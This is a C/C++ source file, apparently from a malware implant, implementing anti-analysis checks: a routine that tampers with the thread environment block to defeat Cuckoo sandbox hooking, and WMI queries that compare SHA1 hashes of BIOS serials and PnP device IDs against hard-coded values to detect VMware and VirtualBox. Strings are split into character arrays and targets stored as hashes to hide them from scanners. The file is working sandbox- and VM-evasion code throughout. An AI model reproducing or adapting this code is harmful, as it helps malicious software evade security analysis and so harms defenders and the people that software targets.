#include <Windows.h>
#include "utils.h"
#include "proto.h"
#include "antivm.h"

#define VMWARE_WORKSTATION_FAIL		"\x76\x6f\x73\x08\xb2\x72\x45\x1a\x87\x51\x30\x18\xc9\x88\x7c\xaa\x60\x75\x3c\x34" // "2d 94 e0 88 ff dc f3 45" -> unicode
#define VMWARE_WORKSTATION_FAIL2	"\x44\xb0\x73\xdc\x0d\x9d\x4c\x84\xd6\x13\x32\xe2\x70\x98\xc0\xf6\x67\x20\xe8\x0d" // "4e 60 5c 00 41 b6 4f f1 " -> unicode
#define VBOX_FAIL					"\xee\xfb\x15\x51\x37\xa9\xa2\x67\x39\x4b\x9e\x9f\xa3\x05\x5f\xf0\xde\x09\xa4\xa7" // "PCI\\VEN_80EE&DEV_CAFE"	-> unicode


BOOL AntiVM()
{
	AntiCuckoo();
	BOOL bVMWare = AntiVMWare();
	BOOL bVBox = AntiVBox();

	if (bVMWare || bVBox)
		return TRUE;

	return FALSE;
}

VOID AntiCuckoo()
{
	LPDWORD pOld, pFake;

	pFake = (LPDWORD) malloc(4096*100);
	memset(pFake, 1, 4096*100);
	__asm
	{
		mov eax, fs:[0x44]		// save old value
		mov pOld, eax

		mov eax, pFake			// replace with fake value
		mov fs:[0x44], eax
	}

	// this will not be logged nor executed.
	CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE) Sleep, (LPVOID) 1000, 0, NULL); 

	__asm
	{
		mov eax, pOld		// restore old value, not reached if cuckoo
		mov fs:[0x44], eax
	}

	free(pFake);
}

BOOL AntiVMWare()
{
	BOOL bVMWareFound = FALSE;
	IWbemLocator *pLoc=0;
	IWbemServices *pSvc=0;

	CoInitialize(NULL);
	if (CoCreateInstance(CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER, IID_IWbemLocator, (LPVOID *)&pLoc) != S_OK)
		return FALSE;
	if (!pLoc)
		return FALSE;

	WCHAR strRootCIM[] = { L'R', L'O', L'O', L'T', L'\\', L'C', L'I', L'M', L'V', L'2', L'\0' };
	BSTR bRootCIM = SysAllocString(strRootCIM);

	if (pLoc->ConnectServer(bRootCIM, NULL, NULL, 0, NULL, 0, 0, &pSvc) == WBEM_S_NO_ERROR) 
	{
		if (CoSetProxyBlanket(pSvc, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL, RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE) == S_OK)
		{
			VARIANT vArg;
			VariantInit(&vArg);

			WCHAR strQuery[] = {L'S', L'E', L'L', L'E', L'C', L'T', L' ', L'*', L' ', L'F', L'R', L'O', L'M', L' ', L'W', L'i', L'n', L'3', L'2', L'_', L'B', L'i', L'o', L's', L'\0' }; 
			WCHAR strSerial[] = { L'S', L'e', L'r', L'i', L'a', L'l', L'N', L'u', L'm', L'b', L'e', L'r', L'\0' };
			if (ExecQueryGetProp(pSvc, strQuery, strSerial, &vArg) && vArg.vt == VT_BSTR)
			{
				LPWSTR strSerial = wcsrchr(vArg.bstrVal, '-');
				if (strSerial)
				{
					strSerial = _wcsdup(strSerial+1);
					
					BYTE pSha1Buffer[20];
					CalculateSHA1(pSha1Buffer, (LPBYTE)strSerial, wcslen(strSerial));

					if (!memcmp(pSha1Buffer, VMWARE_WORKSTATION_FAIL, 20))
						bVMWareFound = TRUE;

					if (!memcmp(pSha1Buffer, VMWARE_WORKSTATION_FAIL2, 20))
						bVMWareFound = TRUE;

					free(strSerial);
				}
			}
			VariantClear(&vArg);
		}
	}

	if(pSvc)
		pSvc->Release();
	if (pLoc)
		pLoc->Release();

	return bVMWareFound;
}

BOOL AntiVBox()
{
	BOOL bVBoxFound = FALSE;
	IWbemLocator *pLoc=0;
	IWbemServices *pSvc=0;

	CoInitialize(NULL);
	if (CoCreateInstance(CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER, IID_IWbemLocator, (LPVOID *)&pLoc) != S_OK)
		return FALSE;
	if (!pLoc)
		return FALSE;

	WCHAR strRootCIM[] = { L'R', L'O', L'O', L'T', L'\\', L'C', L'I', L'M', L'V', L'2', L'\0' };
	BSTR bRootCIM = SysAllocString(strRootCIM);

	if (pLoc->ConnectServer(bRootCIM, NULL, NULL, 0, NULL, 0, 0, &pSvc) == WBEM_S_NO_ERROR) 
	{
		if (CoSetProxyBlanket(pSvc, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL, RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE) == S_OK)
		{
			VARIANT vArg;
			VariantInit(&vArg);

			WCHAR strQuery[] = { L'S', L'E', L'L', L'E', L'C', L'T', L' ', L'*', L' ', L'F', L'R', L'O', L'M', L' ', L'W', L'i', L'n', L'3', L'2', L'_', L'P', L'n', L'P', L'E', L'n', L't', L'i', L't', L'y', L'\0' };
			WCHAR strDeviceId[] = { L'D', L'e', L'v', L'i', L'c', L'e', L'I', L'd', L'\0' };
			if (ExecQuerySearchEntryHash(pSvc, strQuery, strDeviceId, (LPBYTE)VBOX_FAIL, &vArg))
				bVBoxFound = TRUE;
			VariantClear(&vArg);
		}
	}

	if(pSvc)
		pSvc->Release();
	if (pLoc)
		pLoc->Release();

	return bVBoxFound;
}


